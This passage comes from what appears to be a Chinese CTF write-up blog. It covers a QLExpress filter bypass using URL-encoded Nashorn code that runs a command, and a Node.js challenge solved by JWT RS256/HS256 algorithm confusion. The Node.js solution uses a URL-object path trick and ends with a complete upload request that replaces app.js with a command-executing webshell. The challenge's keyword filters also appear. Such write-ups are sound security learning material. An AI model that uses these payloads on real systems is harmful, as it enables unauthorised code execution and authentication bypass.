class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="string">&quot;guanzhujiasBndundunjiechan&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runner.execute(cmd, context, <span class="literal">null</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><a href="https://github.com/alibaba/QLExpress%EF%BC%8C%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E8%AF%B4%E6%98%8E%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%E6%89%A7%E8%A1%8C%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://github.com/alibaba/QLExpress，官方文档说明可以通过第一个参数执行表达式</a></p><p>但是有默认的黑名单</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/640.png" alt="图片"></p><p>并且waf，不能通过<code>+</code>字符串拼接绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;process|runtime|javascript|\\+|char|\\\\|from|\\[|\\]|load&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (pattern.matcher(cmd).find()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>字符串过滤可以通过url编码绕过，配合<a href="https://mouse0w0.github.io/2018/12/02/Introduction-to-Nashorn/">Nashorn —— Java 8 JavaScript 引擎</a>，可以进行命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>).getInputStream()</span><br><span class="line">%6a%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%2e%6c%<span class="number">61</span>%6e%<span class="number">67</span>%2e%<span class="number">52</span>%<span class="number">75</span>%6e%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6d</span>%<span class="number">65</span>%2e%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">52</span>%<span class="number">75</span>%6e%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6d</span>%<span class="number">65</span>%<span class="number">28</span>%<span class="number">29</span>%2e%<span class="number">65</span>%<span class="number">78</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">63</span>%<span class="number">61</span>%6c%<span class="number">63</span>%<span class="number">22</span>%<span class="number">29</span>%2e%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">49</span>%6e%<span class="number">70</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">6d</span>%<span class="number">28</span>%<span class="number">29</span></span><br><span class="line">或者去掉.getInputStream()也可</span><br><span class="line">    </span><br><span class="line">&#123;<span class="string">&quot;x&quot;</span>:<span class="string">&quot;guanzhujiasBndundunjiechan&quot;</span>,</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName(\&quot;nashorn\&quot;).eval(java.net.URLDecoder.decode(\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\&quot;));&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118111040605.png" alt="image-20221118111040605"></p><h2 id="HackThisBOx"><a href="#HackThisBOx" class="headerlink" title="HackThisBOx"></a>HackThisBOx</h2><p>给了docker附件</p><p>app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> &#123; expressjwt &#125; = <span class="built_in">require</span>(<span class="string">&quot;express-jwt&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> indexRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> apiRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/api&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;twig&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: <span class="string">&#x27;/tmp&#x27;</span> &#125;).<span class="title function_">array</span>(<span class="string">&quot;file&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> publicKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./config/public.pem&#x27;</span>);    <span class="comment">// jwt解密阶段使用公钥</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">expressjwt</span>(&#123; <span class="attr">secret</span>: publicKey, <span class="attr">algorithms</span>: [<span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;RS256&quot;</span>]&#125;).<span class="title function_">unless</span>(&#123; <span class="attr">path</span>: [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;/api/login&quot;</span>] &#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;    <span class="comment">// 这一中间件对get、post，auth的数据进行过滤，过滤了危险字符和关键字</span></span><br><span class="line">  <span class="keyword">if</span>([req.<span class="property">body</span>, req.<span class="property">query</span>, req.<span class="property">auth</span>, req.<span class="property">headers</span>].<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">auth</span>)</span><br><span class="line">      <span class="keyword">return</span> item &amp;&amp; <span class="regexp">/\.\.\/|proc|public|routes|\.js|cron|views/img</span>.<span class="title function_">test</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item));</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;illegal data.&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">next</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api&#x27;</span>, apiRouter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">message</span> = err.<span class="property">message</span>;</span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">error</span> = req.<span class="property">app</span>.<span class="title function_">get</span>(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">status</span> || <span class="number">500</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">  <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Application instance, the access address is http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>注意如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="title function_">expressjwt</span>(&#123; <span class="attr">secret</span>: publicKey, <span class="attr">algorithms</span>: [<span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;RS256&quot;</span>]&#125;).<span class="title function_">unless</span>(&#123; <span class="attr">path</span>: [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;/api/login&quot;</span>] &#125;))</span><br></pre></td></tr></table></figure><p>使用RSA公钥+HS256算法进行签名验证</p><p>而公钥题目给了，所以可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p><p><a href="https://www.freebuf.com/articles/web/290668.html">JWT攻击常用的两种算法 - FreeBuf网络安全行业门户</a></p><blockquote><p>JWT最常用的两种算法是<strong>HMAC</strong>和<strong>RSA</strong>。</p><p>HMAC（对称加密算法）用同一个密钥对token进行签名和认证。</p><p>而RSA（非对称加密算法）需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。</p><p>如果将<strong>alg</strong>参数改成<strong>HS256</strong>，这样就将<strong>算法RS256修改为HS256</strong>，让服务器不使用对称加密，转而使用非对称加密算法</p><p>那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p><p>后端代码会使用RSA公钥+HS256算法进行签名验证。进而攻击者将达到目的。</p><p><strong>防御措施：JWT配置应该只允许使用HMAC算法或公钥算法，决不能同时使用这两种算法。</strong></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// res.render(&#x27;index&#x27;, &#123; title: &#x27;HackThisBox&#x27; &#125;);</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;docker/docker/src/config/public.pem&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>,<span class="attr">isAdmin</span>: <span class="literal">true</span>,<span class="attr">home</span>:<span class="string">&quot;flag&quot;</span> &#125;, cert, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">auth</span>.<span class="property">username</span>);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><a href="https://juejin.cn/post/7088985692826517535">前后端的身份认证 - JWT 认证机制 - 掘金 (juejin.cn)</a></p><p>伪造token，进行身份绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Authorization</span>: <span class="title class_">Bearer</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<span class="property">eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaG9tZSI6ImZsYWciLCJpYXQiOjE2NjgzMTM1OTV9</span>.<span class="property">_Pg3j_P5y4qit5e9GXQ4dTN2yRFF3MbKrFxW1SGGFf4</span></span><br></pre></td></tr></table></figure><p>题目环境通过<code>nodemon</code>启动，因此我们可以写入覆盖app.js，从而写入一个简单的<code>webshell</code>。</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118113240494.png" alt="image-20221118113240494"></p><p>但是由于 app.js 里的中间件对请求数据进行了过滤，所以必须绕过。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>([req.<span class="property">body</span>, req.<span class="property">query</span>, req.<span class="property">auth</span>, req.<span class="property">headers</span>].<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> item &amp;&amp; <span class="regexp">/\.\.\/|proc|public|routes|\.js|cron|views/img</span>.<span class="title function_">test</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item));</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;illegal data.&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">next</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>题目在写文件的时候，用的是<code>writeFileSync</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fs.<span class="title function_">readFile</span>(req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">path</span>, <span class="keyword">function</span>(<span class="params">err, data</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(err) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;error222&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">        fs.<span class="title function_">writeFileSync</span>(savePath, data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而fs.writeFileSync方法支持传入一个url对象，考虑是否可以通过伪造一个url对象来绕过waf的过滤</p><p>查看 <code>fs.writeFileSync</code> 源码：</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/640-1668742641229-4.png" alt="图片"></p><p>之后的调用和<code>readFileSync</code>的trick差不多，<a href="https://sk1y233.github.io/2022/11/01/readFileSync%E6%B5%85%E5%88%86%E6%9E%90/">readFileSync浅分析 | Sk1y’s Blog (sk1y233.github.io)</a></p><p>直接到结论：<code>传入的path里面的 pathname 属性 URL 解码后返回最为最终路径</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/640-1668742845260-7.png" alt="图片"></p><p>本地生成jwt token，官方wp的脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> publicKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./public.pem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span>, <span class="attr">isAdmin</span>: <span class="literal">true</span>, <span class="attr">home</span>: &#123;</span><br><span class="line">    <span class="attr">href</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="attr">origin</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="attr">protocol</span>: <span class="string">&quot;file:&quot;</span>,</span><br><span class="line">    <span class="attr">hostname</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">pathname</span>: <span class="string">&quot;app%2e%6a%73&quot;</span></span><br><span class="line">  &#125; &#125;, publicKey, &#123; <span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">send</span>(&#123;</span><br><span class="line">    token</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Application instance, the access address is http://%s:%s&quot;</span>, host, port)</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>而后上传文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> host</span><br><span class="line">User-Agent<span class="punctuation">:</span> python-requests/<span class="number">2.27</span><span class="number">.1</span></span><br><span class="line">Accept-Encoding<span class="punctuation">:</span> gzip<span class="punctuation">,</span> deflate</span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaG9tZSI6eyJocmVmIjoiYSIsIm9yaWdpbiI6ImEiLCJwcm90b2NvbCI6ImZpbGU6IiwiaG9zdG5hbWUiOiIiLCJwYXRobmFtZSI6ImFwcCUyZSU2YSU3MyJ9LCJpYXQiOjE2NjQzOTAxMDJ9.xnPaQ0sv8ExJIqmUdprvOK18pqY6uff9CLvHU8zAAwE</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 619</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=e6a70575f2b3431196ed9ea9baa5f630</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--e6a70575f2b3431196ed9ea9baa5f630</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;check.js&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var express = require(&#x27;express&#x27;);</span></span><br><span class="line"><span class="comment">var process = require(&#x27;child_process&#x27;)</span></span><br><span class="line"><span class="comment">var app = express();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">app.get(&#x27;/&#x27;, function(req, res) &#123;</span></span><br><span class="line"><span class="comment">    var result = process.execSync(req.query.cmd).toString();</span></span><br><span class="line"><span class="comment">    return res.send(result);</span></span><br><span class="line"><span class="comment">&#125;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var server = app.listen(8000, function () &#123;</span></span><br><span class="line"><span class="comment">    var host = server.address().address</span></span><br><span class="line"><span class="comment">    var port = server.address().port</span></span><br><span class="line"><span class="comment">    console.log(&quot;Application instance, the access address is http://%s:%s&quot;, host, port)</span></span><br><span class="line"><span class="comment">&#125;);</span></span><br><span class="line"><span class="comment">--e6a70575f2b3431196ed9ea9baa5f630--</span></span><br></pre></td></tr></table></figure><h2 id="Misc-奇怪的E"><a href="#Misc-奇怪的E" class="headerlink" title="Misc_奇怪的E"></a>Misc_奇怪的E</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221112154615259.png" alt="image-20221112154615259"></p><p>密码Cetacean</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;EEEEEEEEEeeEEeeEEEEEEEEEEeeEeeEEEEEEEEEEEeeEEEEeEEEEEEEEEeeEEeeeEEEEEEEEEeeeeEeeEEEEEEEEEeEEEEeeEEEEEEEEEeeEEeEeEEEEEEEEEeeeEeEEEEEEEEEEEeeEEEEeEEEEEEEEEeeEEEeeEEEEEEEEEEeeEeEEEEEEEEEEEeeEEEEeEEEEEEEEEeeEeeeEEEEEEEEEEeEeeeeeEEEEEEEEEeEEEEeeEEEEEEEEEEeeEEEeEEEEEEEEEeeeEEEEEEEEEEEEEeeEeEEEEEEEEEEEEeeEEeEeEEEEEEEEEeeeEEeEEEEEEEEEEeEeeeeeEEEEEEEEEEeeEEEeEEEEEEEEEeeeEEeeEEEEEEEEEeEeeeeeEEEEEEEEEeeEEEEeEEEEEEEEEeEeeeeeEEEEEEEEEeeEEeeeEEEEEEEEEEeeEEEEEEEEEEEEEeeEeeeeEEEEEEEEEeeEEeEEEEEEEEEEEeEeeeeeEEEEEEEEEeeEEeEeEEEEEEEEEeEEeeeEEEEEEEEEEeeEEEeeEEEEEEEEEEeeEEEEEEEEEEEEEeeEEeEEEEEEEEEEEeeEEeEeEEEEEEEEEEeEEEEeEEEEEEEEEEeEEEEeEEEEEEEEEEeEEEEeEEEEEEEEEEeEEEEeEEEEEEEEEeeeeeEe&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;e&quot;</span>:</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span 